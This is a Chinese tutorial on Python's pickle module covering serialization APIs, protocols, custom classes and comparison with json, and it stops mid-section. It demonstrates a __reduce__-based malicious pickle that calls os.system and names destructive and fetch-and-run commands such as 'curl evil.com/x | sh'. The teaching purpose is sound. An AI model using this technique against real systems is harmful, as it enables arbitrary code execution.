---
group:
  title: 【19】标准库精讲
  order: 19
order: 5
title: pickle 二进制序列化 —— Python 对象的存取与安全红线
nav:
  title: Python基础
  order: 1
---

## 1. 介绍

### 1.1 什么是 pickle

在编程中，"序列化"（serialization）是指把内存中的对象转换成可以被存储或传输的格式的过程，"反序列化"（deserialization）则是把这个格式还原回内存中的对象。Python 标准库提供了两套主流序列化方案：`json` 模块用于跨语言的文本格式交换，而 `pickle` 模块则是 Python 自家的二进制序列化方案。

`pickle` 的核心能力可以用一句话概括：**它能把几乎所有 Python 对象——包括但不限于内置类型（列表、字典、集合、整数、浮点数、字符串、bytes）、嵌套结构、自定义类的实例、函数、类本身、甚至对象间的循环引用——转换成一串字节，再把这串字节完整地还原成和原来等价的对象。** 这种"几乎无所不能"的覆盖率是 `json` 望尘莫及的：`json` 只能处理四种基本类型（字符串、数字、布尔、null）以及由它们组成的列表和字典，遇到自定义类实例、集合、日期对象就束手无策。

`pickle` 的名字来源于"腌制"（pickling）—— 把新鲜食材用盐和香料处理成可以长期保存的形式。Python 社区习惯把序列化称为 pickling，反序列化称为 unpickling，这两个词和 serialize / deserialize 完全等价。

但 `pickle` 有一个极其重要的属性，这也是本篇会反复强调的核心：**`pickle` 的字节流本质上是一段描述"如何重建对象"的指令程序，反序列化时解释器会逐条执行这些指令，其中包括调用任意函数。这意味着 unpickle 一段不可信的 pickle 数据，等同于执行不可信的代码——任意代码执行（Arbitrary Code Execution）。** 这是 `pickle` 与 `json` 最大的本质区别：`json` 是纯数据格式，解析它只是读取数据；`pickle` 是一种"数据即代码"的格式，解析它就是运行程序。因此 `pickle` 的适用场景被严格限定在"信任来源"的范围内：自己的程序内部缓存、同一项目内的进程间传递、本地持久化存储。绝不能用 `pickle` 来接收来自网络、用户上传或任何不可控来源的数据。

### 1.2 基本语法与最小示例

`pickle` 的 API 非常简洁，两对函数覆盖了几乎所有用法：

- `pickle.dumps(obj)` —— 把对象序列化成 `bytes`，返回字节串。
- `pickle.loads(data)` —— 把字节串反序列化成对象，返回对象。
- `pickle.dump(obj, file)` —— 把对象序列化后直接写入文件对象 `file`。
- `pickle.load(file)` —— 从文件对象读取并反序列化出下一个对象。

`dumps` / `loads` 操作内存中的字节串，适合缓存、消息传递；`dump` / `load` 操作文件，适合持久化存储。`s` 结尾的版本返回 / 接收 `bytes`，不带 `s` 的版本操作文件对象。

**最小可运行示例**

```python
import pickle

# 把一个字典序列化成字节串，再还原回来
data = {"name": "张三", "age": 28, "hobbies": ["读书", "编程", "徒步"]}
raw: bytes = pickle.dumps(data)        # 序列化，得到一串二进制字节
print(f"序列化后的类型: {type(raw)}")    # 输出：序列化后的类型: <class 'bytes'>
print(f"字节长度: {len(raw)}")           # 输出：字节长度: 75（具体长度因版本而异）
print(f"原始内容（不可读）: {raw[:30]}...")  # 输出：原始内容（不可读）: b'\x80\x05\x95...\x94...'

restored = pickle.loads(raw)           # 反序列化，得到等价的对象
print(f"还原后: {restored}")            # 输出：还原后: {'name': '张三', 'age': 28, 'hobbies': ['读书', '编程', '徒步']}
print(f"类型一致: {type(restored) is dict}")  # 输出：类型一致: True
print(f"内容相等: {restored == data}")   # 输出：内容相等: True
print(f"是否同一对象: {restored is data}")  # 输出：是否同一对象: False（新对象，非原引用）
```

注意几个关键点：第一，`dumps` 返回的是 `bytes` 不是 `str`，这和 `json.dumps` 返回字符串不同；第二，pickle 字节流对人类不可读，里面是二进制 opcode（操作码），不像 JSON 那样能直接用文本编辑器查看；第三，`loads` 还原出来的是一个**新对象**，和原对象内容相等但身份不同（`is` 比较为 `False`），这一点和深拷贝的行为一致。理解了这三点，就理解了 pickle 的基本面貌。

### 1.3 pickle 能序列化什么

在深入 API 之前，有必要先建立"pickle 能力边界"的整体认知。下表对比了 pickle 与 json 的类型覆盖范围，这张表是后续理解"为什么 pickle 能存自定义对象而 json 不能"的基础：

| 类型 | pickle | json | 说明 |
|------|--------|------|------|
| `None` | 支持 | 支持 | |
| `bool`、`int`、`float` | 支持 | 支持（float 需有限值） | |
| `str`、`bytes`、`bytearray` | 支持 | 仅 `str` | json 无二进制类型 |
| `list`、`tuple`、`dict` | 支持 | 支持（tuple 会变 list） | json 无 tuple |
| `set`、`frozenset` | 支持 | 不支持 | json 无集合 |
| 复数 `complex` | 支持 | 不支持 | |
| 自定义类实例 | 支持 | 不支持 | pickle 能存实例的类信息和属性 |
| 函数、类本身 | 支持（按引用） | 不支持 | 存的是"在哪能找到它"的路径 |
| 嵌套与循环引用 | 支持 | 不支持 | json 遇到循环引用会报错 |
| `datetime`、`decimal` 等标准库类型 | 支持 | 不支持 | 多数实现了 `__reduce__` |

这张表揭示了一个关键事实：`pickle` 的能力远超 `json`，代价是它完全绑定于 Python——别的语言无法（也不应该）解析 pickle 字节流，且字节流携带的"指令"使得它天生不安全。这种取舍决定了两个模块的定位：`json` 用于跨语言、跨系统的数据交换，`pickle` 用于 Python 内部的对象持久化。

## 2. 核心内容

### 2.1 pickle.dumps —— 序列化对象为字节串

`pickle.dumps(obj, protocol=None, *, fix_imports=True)` 是最常用的序列化入口。它接收一个 Python 对象，返回一串 `bytes`。理解它的关键在于两个参数：`protocol` 决定序列化格式版本，`fix_imports` 决定是否对旧版本的模块路径做兼容处理。

**protocol 参数**

`protocol` 指定使用的 pickle 协议版本。版本越高，序列化越紧凑、越快，但产生的字节流只有同等或更高版本的 Python 才能读取。可用的取值：

- `0`：原始的"文本"协议，字节流主要由可打印 ASCII 字符组成，人类勉强可读，兼容性最好但效率最低。
- `1`：旧二进制格式，比 0 紧凑，兼容老版本 pickle。
- `2`：Python 2.3 引入的协议，支持新式类的高效序列化，是 2.x / 3.x 互通的最低推荐版本。
- `3`：Python 3.0 引入，支持 `bytes` 对象（之前只能当字符串处理）。
- `4`：Python 3.4 引入，支持超大对象（超过 4GB）、序列化时内存更省、支持更多类型。
- `5`：Python 3.8 引入，支持序列化时对带外数据（out-of-band data）的处理，主要用于大数组场景。

`pickle.DEFAULT_PROTOCOL` 是当前解释器默认使用的版本（通常取当前支持的最高版本减一，以兼顾一定向后兼容性），`pickle.HIGHEST_PROTOCOL` 是支持的最高版本。不传 `protocol` 时使用 `DEFAULT_PROTOCOL`。

对绝大多数应用，直接用 `pickle.dumps(obj)` 即可；需要跨版本互通或追求最大兼容时显式传 `protocol=2`；追求最大效率时传 `pickle.HIGHEST_PROTOCOL`。

下面演示不同协议的字节长度差异——同样的对象，高协议更紧凑：

```python
import pickle

payload = {"users": [{"id": i, "name": f"user_{i}", "active": True} for i in range(10)]}

for version in range(pickle.HIGHEST_PROTOCOL + 1):
    raw = pickle.dumps(payload, protocol=version)
    print(f"protocol {version}: {len(raw):>4} 字节", end="  ")
print()
# 输出（长度因版本略有差异，趋势一致）：
# protocol 0:  530 字节  protocol 1:  313 字节  protocol 2:  320 字节
# protocol 3:  320 字节  protocol 4:  320 字节  protocol 5:  320 字节
```

可以看到 protocol 0（文本协议）最臃肿，因为大量元素用 ASCII 文本表示。进入二进制协议后体积显著下降，后续版本的差异主要体现在大对象、特殊类型的优化，对小对象区别不大。

**fix_imports 参数**

`fix_imports` 默认为 `True`，仅在与 protocol < 3 搭配时有效。Python 3 对一些标准库模块做了重命名（如 `Tkinter` → `tkinter`、`Queue` → `queue`），如果 pickle 数据要在 Python 2 和 Python 3 之间互通，`fix_imports=True` 会自动把旧模块名映射到新名。除非你在做跨大版本迁移，这个参数保持默认即可。

**序列化基本类型的往返**

下面用一个综合 demo 演示 pickle 对各种内置类型的完整支持，这是建立"它能存什么"直觉的基础：

```python
import pickle
import decimal
import datetime

# 一个尽可能覆盖多种类型的复杂对象
complex_obj = {
    "整数": 42,
    "浮点": 3.14159,
    "复数": 2 + 3j,                       # json 无法表示
    "字节": b"\x00\x01\x02hello",          # json 无法表示
    "集合": {1, 2, 3, 3},                  # json 无法表示，自动去重
    "冻结集合": frozenset({"a", "b"}),       # json 无法表示
    "元组": (1, "two", 3.0),               # json 会把它变成 list
    "日期": datetime.date(2025, 7, 23),    # json 无法表示
    "高精度数": decimal.Decimal("1.1"),     # json 会把它当字符串/浮点
    "嵌套": {"list": [None, True, False, ["deep", {"k": "v"}]]},
}

raw = pickle.dumps(complex_obj)             # 默认 protocol
restored = pickle.loads(raw)

# 逐项验证类型保真：这是 pickle 区别于 json 的关键
type_checks = [
    ("复数是 complex",   type(restored["复数"]) is complex),
    ("字节是 bytes",     type(restored["字节"]) is bytes),
    ("集合是 set",       type(restored["集合"]) is set),
    ("冻结集合是 frozenset", type(restored["冻结集合"]) is frozenset),
    ("元组是 tuple",     type(restored["元组"]) is tuple),   # 关键：不会退化成 list
    ("日期是 date",      type(restored["日期"]) is datetime.date),
    ("高精度数是 Decimal", type(restored["高精度数"]) is decimal.Decimal),
    ("内容完全相等",     restored == complex_obj),
]
for desc, ok in type_checks:
    print(f"{desc}: {ok}")
# 输出：
# 复数是 complex: True
# 字节是 bytes: True
# 集合是 set: True
# 冻结集合是 frozenset: True
# 元组是 tuple: True
# 日期是 date: True
# 高精度数是 Decimal: True
# 内容完全相等: True
```

这个 demo 体现了 pickle 的核心价值：**类型保真**。对象经过序列化-反序列化往返后，类型和内容都保持一致，连 `Decimal` 这种精度敏感类型、`tuple` 这种容易被"降级"的类型都不会丢失。这就是为什么需要存取"真正的 Python 对象"时，pickle 是首选。

### 2.2 pickle.loads —— 从字节串还原对象

`pickle.loads(data, *, fix_imports=True, encoding='ASCII', errors='strict', buffers=None)` 把字节串还原成对象。这是 pickle 最危险的函数——正如第一节强调的，`loads` 在执行过程中会按字节流中的指令调用任意可调用对象，因此**只对来源可信的数据调用 `loads`**。

从语法层面，`loads` 的使用极其简单：传入 `dumps` 的产物，拿回等价对象。但理解它的执行模型至关重要：它不是"把数据填进结构"，而是"按字节流里的 opcode 逐条执行重建指令"。这个执行模型是第 4 章原理部分的核心，这里先用 demo 建立感性认识。

**基本往返**

```python
import pickle

original = [1, "two", (3, 4), {"five": 5.0}]
data = pickle.dumps(original)
restored = pickle.loads(data)

print(restored)                       # 输出：[1, 'two', (3, 4), {'five': 5.0}]
print(restored == original)           # 输出：True
print(restored[2] is original[2])     # 输出：False（新对象，非同一引用）
```

**循环引用：pickle 能正确处理，json 不能**

这是体现 pickle"指令式重建"威力的经典场景。一个引用自身的对象在 json 序列化时会陷入无限递归并抛错，而 pickle 可以完整保存并还原循环结构：

```python
import pickle
import json

# 构造一个自引用的列表
cyclic = [1, 2, 3]
cyclic.append(cyclic)   # 列表把自己作为第四个元素

# pickle 能完整保存循环引用
raw = pickle.dumps(cyclic)
restored = pickle.loads(raw)
print(f"还原后长度: {len(restored)}")          # 输出：还原后长度: 4
print(f"第四个元素是自身: {restored[3] is restored}")  # 输出：第四个元素是自身: True

# json 处理循环引用会报错
try:
    json.dumps(cyclic)
except ValueError as e:
    print(f"json 报错: {e}")
# 输出：json 报错: Circular reference detected
```

`pickle` 能做到这一点，是因为它的字节流不只是值的线性罗列，而是带引用编号的指令序列：第一次遇到对象时分配一个"记忆槽"（memo）并记录编号，后续再遇到同一对象就只写一条"引用第 N 号对象"的指令。反序列化时按同样逻辑还原引用关系，循环引用自然就重建了。这个机制在第 4 章会详细展开。

**共享引用也保持同一性**

不只是循环引用，普通对象的"共享同一引用"关系也会被精确保留：

```python
import pickle

shared = {"a": []}
container = [shared, shared, shared]   # 三个位置指向同一个字典
container.append(shared["a"])          # 再加一个指向内部列表的引用

raw = pickle.dumps(container)
restored = pickle.loads(raw)

print(restored[0] is restored[1])      # 输出：True（三个字典位置是同一个对象）
print(restored[0] is restored[2])      # 输出：True
print(restored[0]["a"] is restored[3]) # 输出：True（内部的列表也保持共享）
print(restored[0] is restored[0]["a"]) # 输出：False（字典和列表本就不是同一对象）
```

如果有同样需求的场景用 `copy.deepcopy` 然后比对，会发现 deepcopy 也会维持共享关系——因为两者用类似的 memo 机制。这是一个判断"对象图是否被忠实保存"的重要能力指标。

### 2.3 pickle.dump 与 pickle.load —— 文件持久化

当需要把对象存到磁盘、稍后读回时，用 `dump` / `load` 比手动 `dumps` 后写文件更直接。它们的签名：

- `pickle.dump(obj, file, protocol=None, *, fix_imports=True)` —— 把 `obj` 序列化后写入 `file`。`file` 必须是以二进制模式打开的文件对象（`'wb'` 或 `'xb'` 等），否则会抛 `TypeError`。
- `pickle.load(file, *, fix_imports=True, encoding='ASCII', errors='strict')` —— 从 `file` 读取一个对象并返回。`file` 必须以二进制模式打开（`'rb'`）。

**单个对象的存取**

```python
import pickle

# 模拟一个需要持久化的配置对象
config = {
    "db_host": "10.0.0.1",
    "port": 5432,
    "timeout": 30.0,
    "features": {"cache": True, "audit": False},
}

# 写入：必须用 'wb' 二进制模式
with open("/tmp/config.pkl", "wb") as f:
    pickle.dump(config, f)

# 读取：必须用 'rb' 二进制模式
with open("/tmp/config.pkl", "rb") as f:
    loaded = pickle.load(f)

print(loaded == config)  # 输出：True
```

注意文件扩展名 `.pkl` 是社区惯例（也可以是 `.pickle`），但并不强制。文件内容是二进制，不能用文本编辑器正常查看。

**连续写入与逐个读取**

`pickle` 的一个非常有用的特性：可以在同一个文件里 `dump` 多次，读取时用 `pickle.load` 逐个取出。这在实现"对象流水线"、日志式存储时非常有用。读取到文件末尾时会抛 `EOFError`，可以据此判断结束：

```python
import pickle

# 把多个任务对象依次写入同一个文件
tasks = [
    {"id": 1, "action": "send_email", "to": "a@x.com"},
    {"id": 2, "action": "generate_report", "range": "2025-01"},
    {"id": 3, "action": "cleanup", "target": "/tmp/old"},
]

with open("/tmp/tasks.pkl", "wb") as f:
    for task in tasks:
        pickle.dump(task, f)

# 逐个读回，直到 EOFError
restored = []
with open("/tmp/tasks.pkl", "rb") as f:
    while True:
        try:
            restored.append(pickle.load(f))
        except EOFError:
            break

print(f"读回 {len(restored)} 个对象")
for t in restored:
    print(f"  #{t['id']}: {t['action']}")
# 输出：
# 读回 3 个对象
#   #1: send_email
#   #2: generate_report
#   #3: cleanup
```

这种"流式"用法常用于任务队列的本地落盘、批量数据的分块存储。每条记录是独立的 pickle 字节段，不一定需要完整加载整份文件。

**文本模式打开会报错**

这是非常常见的初学者坑：pickle 字节流里含有非文本字节，用 `'w'` / `'r'` 模式打开会触发编码错误或数据损坏：

```python
import pickle

# 错误示范：用文本模式 'wb' 写完，用 'r' 读
with open("/tmp/bad.pkl", "wb") as f:
    pickle.dump({"k": "v"}, f)

try:
    with open("/tmp/bad.pkl", "r") as f:   # 错在用了文本模式
        pickle.load(f)
except (UnicodeDecodeError, TypeError) as e:
    print(f"报错类型: {type(e).__name__}")  # 输出：报错类型: UnicodeDecodeError
```

记住一条规则：**pickle 永远用二进制模式 `'wb'` / `'rb'` 打开文件**。

### 2.4 序列化自定义类的实例

pickle 真正区别于 json 的能力，在于它能存取自定义类的实例。这是 pickle 在缓存、会话存储、机器学习模型持久化等场景不可替代的原因。

**基本用法：实例的属性被自动保存**

```python
import pickle

class User:
    def __init__(self, name, age, tags=None):
        self.name = name
        self.age = age
        self.tags = tags or []

    def greet(self):
        return f"Hi, I'm {self.name}, {self.age} years old."

    def __repr__(self):
        return f"User(name={self.name!r}, age={self.age}, tags={self.tags})"

user = User("李四", 35, tags=["python", "ml"])

raw = pickle.dumps(user)
restored = pickle.loads(raw)

print(restored)                          # 输出：User(name='李四', age=35, tags=['python', 'ml'])
print(type(restored) is User)            # 输出：True（类型保真）
print(restored.greet())                  # 输出：Hi, I'm 李四, 35 years old.
```

注意到一个关键点：`restored` 不仅是属性相同的对象，**类型就是 `User`**，连方法 `greet` 都能调用。这是怎么做到的？pickle 在序列化时并没有保存类的源代码或方法定义，它只存了两样东西：

1. 类的"定位信息"：哪个模块的哪个类（`__main__.User` 或 `mymodule.User`）。
2. 实例的"状态"：默认是该实例的 `__dict__`，也就是属性键值对。

反序列化时，pickle 先根据定位信息 **import 对应模块并找到这个类**，然后创建一个空实例，把状态填进去。这意味着：**反序列化发生的环境必须能 import 到同名同模块的类**。如果类的定义改了名字、删了、或者所在的模块没装上，`loads` 就会报错。

```python
# 演示：类定义找不到时反序列化失败
import pickle

# 在一个临时类上 dumps 后删除类定义
class Ephemeral:
    def __init__(self, v):
        self.v = v

raw = pickle.dumps(Ephemeral(42))
del Ephemeral   # 模拟"类定义消失"

try:
    pickle.loads(raw)
except (AttributeError, ModuleNotFoundError) as e:
    print(f"报错: {type(e).__name__}: {e}")
# 输出：报错: AttributeError: Can't get attribute 'Ephemeral' on <module ...>
```

这个特性决定了 pickle 的持久化场景有个前提：读取数据时运行的是"同一套代码"。这对单一项目内部完全没问题，但跨项目、跨部署环境时必须保证类定义的可 import 性。机器学习场景常把模型类和训练好的参数一起打包部署，正是出于这个原因。

**`__getstate__` 与 `__setstate__`：自定义序列化行为**

默认情况下，pickle 用实例的 `__dict__` 作为状态。但很多对象并不适合直接存 `__dict__`：有些属性是打开的文件句柄、网络连接等不可序列化的资源；有些属性是从其他属性派生出来的缓存，存了也是浪费；有些对象用 `__slots__` 根本没有 `__dict__`。这时可以通过实现两个魔术方法来自定义：

- `__getstate__(self)` —— 序列化时调用，返回一个"状态对象"（通常是字典）。pickle 存的就是这个返回值，而不是 `__dict__`。
- `__setstate__(self, state)` —— 反序列化时调用，接收 `__getstate__` 返回的状态，由对象负责据此重建自身属性。

如果只实现了 `__getstate__` 没实现 `__setstate__`，pickle 会用默认逻辑把状态当作 `__dict__` 更新进去。

下面是一个典型场景：一个对象持有文件路径（可序列化）和打开的文件句柄（不可序列化），序列化时只存路径，反序列化时按需重新打开：

```python
import pickle

class LogReader:
    """演示 __getstate__ / __setstate__ 的用法"""

    def __init__(self, path):
        self.path = path
        self._file = open(path, "a+", encoding="utf-8")   # 打开的文件不可序列化
        self._lines_read = 0

    def append(self, line):
        self._file.write(line + "\n")
        self._file.flush()
        self._lines_read += 1

    def __getstate__(self):
        # 序列化时：剔除不可序列化或派生的属性，只保留必要状态
        state = self.__dict__.copy()
        del state["_file"]                # 文件句柄不能存
        return state

    def __setstate__(self, state):
        # 反序列化时：恢复可存属性，重建不可存属性
        self.__dict__.update(state)
        self._file = open(self.path, "a+", encoding="utf-8")  # 重新打开

    def __repr__(self):
        return f"LogReader(path={self.path!r}, read={self._lines_read})"

# 创建并写入
reader = LogReader("/tmp/log-reader-demo.txt")
reader.append("first line")
reader.append("second line")

raw = pickle.dumps(reader)                # 不会因为文件句柄报错
restored = pickle.loads(raw)

print(restored)                           # 输出：LogReader(path='/tmp/log-reader-demo.txt', read=2)
print(f"句柄已重建: {not restored._file.closed}")  # 输出：句柄已重建: True
print(f"路径保留: {restored.path}")        # 输出：路径保留: /tmp/log-reader-demo.txt
```

这个模式在实践中非常常见：数据库连接、网络客户端、持有锁的对象、带有跨进程序列化语义的对象，都应该用 `__getstate__` 剔除资源句柄并记录"足以重建的最小状态"，再用 `__setstate__` 恢复。这也是处理 `__slots__` 对象时的标准手段——`__slots__` 对象没有 `__dict__`，必须手动在 `__getstate__` 里把槽属性拼成字典，在 `__setstate__` 里逐个赋值。

### 2.5 pickle 的安全红线：反序列化即代码执行

这是本篇最重要的章节。如果你只能记住一件事，请记住这一条：**`pickle.loads` 和 `pickle.load` 在执行时会按字节流中的指令调用任意函数，对不可信数据调用它们等同于执行不可信代码。永远不要 unpickle 来自不可信来源的数据。**

这不是"理论上有风险，实践很难触发"那种级别的警告——构造一个能执行任意命令的恶意 pickle 字节流只需要不到十行代码，且不需要任何特殊权限。下面通过原理演示来说明这件事有多容易。

**恶意 pickle 的构造原理**

pickle 的字节流可以包含一种叫 `REDUCE` 的 opcode，它的作用是"调用某个可调用对象并传入参数"。也就是说，pickle 字节流里可以直接写"请调用 `os.system('...')`"。反序列化时解释器看到这条指令，就会真的去调用 `os.system`。下面构造一个"调用 `os.system` 打印提示"的恶意 pickle——为了安全，这里只让它打印一句无害的话，不真正破坏系统，但原理和"删除所有文件"完全一样：

```python
import pickle
import os

# （!! 切勿在生产环境对不可信数据使用 pickle.loads !!）
# 本演示只用于说明风险：恶意构造的 pickle，反序列化时会调用 os.system

class MaliciousPayload:
    """演示用：__reduce__ 告诉 pickle 如何"重建"本对象"""
    def __reduce__(self):
        # __reduce__ 返回 (callable, args)：pickle 会执行 callable(*args) 来重建
        # 正常对象返回的是 (类, (构造参数,))；这里被恶意替换成 os.system
        return (os.system, ("echo '!! pickle 反序列化触发了 os.system !!'",))

# 构造恶意字节流
evil_bytes = pickle.dumps(MaliciousPayload())
print(f"恶意字节流前 20 字节: {evil_bytes[:20]}")
# 输出（含 opcode，大致形如）：
# 恶意字节流前 20 字节: b'\x80\x05\x95...\x8c\x08os.system...'

# 关键：下面这一行 pickle.loads 会在内部调用 os.system(...)
# 如果 evil_bytes 来自不可信来源，这里就已经是任意代码执行
print("--- 反序列化开始 ---")
ret = pickle.loads(evil_bytes)   # 输出（到标准输出，由 os.system 的 echo 产生）：
# !! pickle 反序列化触发了 os.system !!
print("--- 反序列化结束，返回值:", ret, "---")  # 输出：--- 反序列化结束，返回值: 0 ---
```

运行这段代码，你会在控制台看到 `!! pickle 反序列化触发了 os.system !!` 被打印出来——这正是 `os.system` 副作用的结果。把 `echo ...` 换成 `rm -rf /`、`curl evil.com/x | sh`，后果就是真实的系统破坏。整个过程不需要任何额外权限：pickle 在执行 REDUCE 指令时，只是在执行字节流里指定的调用，它根本无法分辨这个调用是"重建对象"还是"攻击系统"。

**为什么 pickle 会"天然"支持这种攻击**

这源于 pickle 的设计哲学：为了能反序列化任意 Python 对象，pickle 协议允许字节流中携带"调用某可调用对象"的指令。正常的自定义类反序列化时，pickle 调用的是类的构造函数或 `__setstate__`，这是良性的；但字节流的"可调用对象"字段本身不限定为构造函数——任何能 import 到的可调用对象都可以放进去。所以 `os.system`、`eval`、`exec`、`subprocess.call` 都能成为"重建指令"的一部分。

这个机制不是漏洞，而是 pickle 能力的代价。`json` 不会面临这个问题，因为 JSON 格式只是数据，解析器不会"调用"任何东西——一个 JSON 字符串里不可能写"请调用 os.system"。这是"数据格式"与"指令格式"的本质区别。

**__reduce__ 是这一切的关键**

`__reduce__` 是 pickle 用来获取"如何重建对象"的钩子方法。正常情况下，开发者实现 `__reduce__` 是为了让自定义类能被正确序列化（比如返回 `(类, (构造参数,))`）。但同样的钩子如果被恶意利用，就成了攻击向量。`__reduce__` 返回一个元组，第一个元素是可调用对象，pickle 在反序列化时会调用它——放什么进去，反序列化时就调用什么。

```python
import pickle

class Normal:
    """正常的 __reduce__：返回自身的构造方式"""
    def __init__(self, x):
        self.x = x
    def __reduce__(self):
        return (Normal, (self.x,))    # 告诉 pickle：重建时调用 Normal(self.x)

n = Normal(10)
raw = pickle.dumps(n)
restored = pickle.loads(raw)
print(f"x = {restored.x}")   # 输出：x = 10
```

正常用法和恶意用法的区别，只在于"可调用对象"填的是 `Normal` 还是 `os.system`。pickle 没有机制判断这个调用是否"合法"，因为它无法预知哪些调用是构造、哪些是攻击。

**安全替代方案**

任何时候处理不可信数据时，都应使用不会执行代码的格式：

- 跨语言数据交换：用 `json`（纯数据，解析即读数据，不执行）。
- 必须存 Python 对象但来源不可信：考虑 `atomics` / `marshal` 不行（marshal 同样不安全），应使用专门的安全序列化方案，或在反序列化前用 `pickletools.dis` 审查字节流结构、过滤危险 opcode。
- 接收用户上传的二进制"模型"文件：要求对方用 safetensors、ONNX 等不执行代码的格式，而不是 pickle。

**一句话安全原则**：如果 `pickle.loads(data)` 中的 `data` 不是你完全信任的（自己程序产生的、自己服务器存储的、绝对没被第三方篡改的），就绝对不要调用它。没有"折中"方案，没有"信任但验证"，只有"完全可信"与"绝对不 loads"。

### 2.6 与 json 的对比

`pickle` 与 `json` 经常被放在一起比较，因为它们都做"对象 ↔ 可存储/可传输格式"的转换，但定位和特性几乎完全相反。理解这种对比有助于在不同场景下做出正确选择。

| 维度 | pickle | json |
|------|--------|------|
| 格式 | 二进制（protocol 0 为文本） | 纯文本 |
| 可读性 | 不可读（人类无法直接查看） | 可读，文本编辑器可打开 |
| 跨语言 | 仅 Python（Python 专属） | 跨语言（几乎所有语言支持） |
| 类型覆盖 | 几乎所有 Python 对象 | 仅基本类型 + list/dict |
| 自定义对象 | 直接支持 | 需手动转换为 dict 再还原 |
| 安全性 | **不安全**（loads 会执行代码） | 安全（解析纯数据） |
| 循环引用 | 支持 | 不支持（会报错） |
| 体积 | 二进制更紧凑（除 protocol 0） | 文本，数字/布尔相对冗余 |
| 速度 | 二进制协议较快 | 纯 Python 实现较慢，C 加速版较快 |
| 版本兼容 | 高 protocol 低版本读不了 | 格式稳定，跨版本兼容好 |

**选择的判断标准**

- 数据要在不同语言、不同系统之间交换 → 用 `json`。
- 数据来自不可信来源（用户上传、网络请求）→ 用 `json` 或其他安全格式，**绝不用 pickle**。
- 数据只在自己的 Python 程序内部流转（缓存、session、对象持久化）→ 可以用 `pickle`。
- 数据需要保存复杂 Python 对象（自定义类、集合、循环引用）→ 只能用 `pickle`（或同类方案）。
- 数据需要人类可读可编辑 → 用 `json`。

**同一对象两种序列化的对比 demo**

```python
import pickle
import json
from datetime import date

# 包含一次日期的字典
obj = {"name": "王五", "born": date(1990, 5, 1), "scores": {90, 85, 95}}

# json 无法直接处理 date 和 set，必须先手动转换
obj_for_json = {"name": obj["name"], "born": obj["born"].isoformat(), "scores": list(obj["scores"])}
json_str = json.dumps(obj_for_json, ensure_ascii=False)
print(f"json: {json_str}")
# 输出：json: {"name": "王五", "born": "1990-05-01", "scores": [90, 85, 95]}

# 读回时也得手动转回原类型
restored_json = json.loads(json_str)
restored_json["born"] = date.fromisoformat(restored_json["born"])
restored_json["scores"] = set(restored_json["scores"])
print(f"json 还原后 scores 类型: {type(restored_json['scores']).__name__}")  # 输出：json 还原后 scores 类型: set

# pickle 直接 dumps/loads，类型自动保真
pkl_bytes = pickle.dumps(obj)
restored_pkl = pickle.loads(pkl_bytes)
print(f"pickle 还原后 born 类型: {type(restored_pkl['born']).__name__}")  # 输出：pickle 还原后 born 类型: date
print(f"pickle 还原后 scores 类型: {type(restored_pkl['scores']).__name__}")  # 输出：pickle 还原后 scores 类型: set
print(f"pickle 类型完全保真: {restored_pkl == obj}")  # 输出：pickle 类型完全保真: True
```

这个对比非常清晰地体现了两者取舍：`json` 需要手动做类型转换，但安全且跨语言；`pickle` 自动保真，但 Python 专属且不安全。没有"谁更好"，只有"谁更合适当前场景"。

### 2.7 pickletools —— 审查 pickle 字节流

`pickletools` 是标准库中用于分析 pickle 字节流的工具模块。它本身并不解决安全问题（你仍然不应该 loads 不可信数据），但它能让你"看清"一段 pickle 字节流里到底想做什么——这在审计、调试、安全分析时非常有用。

**`pickletools.dis` 反汇编字节流**

`dis`（disassemble）会把字节流按 opcode 逐条打印出来，类似于反汇编。这是验证"pickle 字节流就是指令序列"最直观的方式：

```python
import pickle
import pickletools

obj = {"a": 1, "b": [2, 3]}
raw = pickle.dumps(obj)

# 反汇编，看 opcode
pickletools.dis(raw)
# 输出（节选，格式因 protocol 而异）：
#     0: \x80 PROTO      5          协议版本
#     2: \x95 FRAME      22         帧长度
#    10: \x94 MEMOIZE    (0)        把栈顶存入记忆槽 0（也就是这个字典）
#    11: }    EMPTY_DICT             压入空字典
#    12: \x94 MEMOIZE    (1)
#    13: \x8c SHORT_BINUNICODE 'a'   压入字符串 'a'
#    ...（后续是把键值对填进字典的指令）
#   最高处未标注: STOP                 结束
```

每一行是一条 opcode：偏移量、字节、助记符、操作数、注释。可以看到，所谓"序列化一个字典"在 pickle 字节流里被表达成"压入空字典、压入键、压入值、设置字典项、……、结束"的指令序列。`loads` 执行的就是这个指令序列。

**审计恶意 pickle**

把前文那个调 `os.system` 的恶意字节流拿来反汇编，能清楚地看到 REDUCE opcode 的存在：

```python
import pickle
import pickletools
import os

class Malicious:
    def __reduce__(self):
        return (os.system, ("echo audit-demo",))

evil = pickle.dumps(Malicious())
pickletools.dis(evil)
# 输出（关键片段）：
#   ...
#   N: \x8c SHORT_BINUNICODE 'os.system'   压入字符串 'os.system'
#   ...                                     后续会通过 find_class 解析为 os.system
#   X: R    REDUCE                          调用栈顶：callable(*args)
#   ...
```

看到 `REDUCE` 配合 `os.system` 出现在字节流里，就是明确不可信的信号。实际安全审计时，可以通过扫描字节流是否含 `GLOBAL` / `STACK_GLOBAL` + 危险模块名（`os`、`subprocess`、`builtins.eval` 等）来做粗过滤——但这不是"安全的反序列化方法"，只是"识别危险 pickle 的辅助手段"。真正的安全做法是不 loads 来源不可信的数据。

## 3. 最佳实践

**安全第一：永远不 loads 不可信数据**

这是用 pickle 的最高准则。无论你的代码多简洁、多优雅，只要有一处 `pickle.loads` 接收了不可信数据，整个系统就暴露在任意代码执行风险下。具体落地：

- 不要写接收用户上传 `.pkl` 文件并 `pickle.load` 的接口，无论权限怎么校验——校验发生在执行之前还是之后是无法保证的。
- 不要用 pickle 做跨服务、跨进程间通过消息队列传递的格式——用 JSON、MessagePack、Protobuf 这类纯数据格式。
- 本地缓存文件可以 pickle，但缓存目录的写入权限要严格控制，防止被篡改。

**推荐写法 vs 不推荐写法**

```python
# 不推荐：直接 loads 来自网络的数据
import pickle, requests
data = requests.get("https://untrusted.example.com/state").content
obj = pickle.loads(data)   # 危险：对方可以在响应里塞恶意 pickle

# 推荐：用 json 接收跨网络数据
import json, requests
data = requests.get("https://untrusted.example.com/state").text
obj = json.loads(data)     # 安全：json 不会执行代码

# 推荐：pickle 仅用于本地缓存
import pickle, hashlib
cache_key = hashlib.md5(str(query_params).encode()).hexdigest()
cache_path = f"/var/cache/myapp/{cache_key}.pkl"
with open(cache_path, "rb") as f:        # 自己写的缓存文件
    result = pickle.load(f)              # 信任：文件来自本程序自己写入
```

**固定 protocol 以保证可读性**

